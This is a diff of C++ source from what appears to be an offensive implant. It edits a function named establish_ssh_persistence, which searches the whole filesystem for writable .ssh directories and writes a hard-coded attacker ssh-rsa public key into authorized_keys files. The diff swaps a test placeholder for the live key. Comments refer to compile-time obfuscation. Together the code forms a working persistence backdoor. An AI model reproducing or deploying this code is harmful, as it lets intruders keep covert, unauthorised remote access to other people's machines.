@@ -29,13 +29,15 @@ bool file_is_writable(std::string file_path);
 
 bool establish_ssh_persistence() {
 
-    // const std::string public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is public
+    // this doesn't need compile time obfuscation because it is a public key
+    const std::string public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is public
 
-    const std::string public_key = "This means a successful test!";
+    // const std::string public_key = "This means a successful test!";
 
     int counter { 0 };
 
-	std::string writable_ssh_directories_command = run_command("find / -type d -name .ssh -writable 2>/dev/null");
+    // it is imperative that the output of this command DOES NOT contain STDERR messages; if it does it will attempt like 500 file writes in 1 second
+	std::string writable_ssh_directories_command = run_command("find / -type d -name .ssh -writable", "/dev/null");
 
 	std::istringstream stream(writable_ssh_directories_command);
 	std::string current_line;
@@ -46,8 +48,6 @@ bool establish_ssh_persistence() {
 
     if (writable_ssh_directories.size() == 0) {return false;}                       // no opportunity for SSH based persistence
     else {
-
-
         /*                  At this point it is known that the directories in writable_ssh_directories are writable
          * 2 conditions to check for:
          *      1. the authorized_keys file exists and is writable
@@ -105,7 +105,7 @@ bool create_and_populate_authorized_keys_file(std::string full_path, std::string
 }
 
 bool write_public_key_fingerprint(std::string target_file, std::string public_key) {
-    const std::string SSH_PUBLIC_KEY_FINGERPINT = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is a public key
+    // const std::string SSH_PUBLIC_KEY_FINGERPINT = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is a public key
 
     // const std::string SSH_PUBLIC_KEY_FINGERPINT = "this is the test value\n";               // placeholder value so there aren't a trillion public key writes
 
